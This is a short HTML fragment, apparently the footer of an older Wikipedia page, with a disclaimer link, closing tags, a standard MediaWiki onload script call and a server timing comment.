					<li id="disclaimer"><a href="/wiki/Wikipedia:General_disclaimer" title="Wikipedia:General disclaimer">Disclaimers</a></li>
			</ul>
		</div>
</div>

		<script type="text/javascript">if (window.runOnloadHook) runOnloadHook();</script>
<!-- Served by srv123 in 0.048 secs. --></body></html>
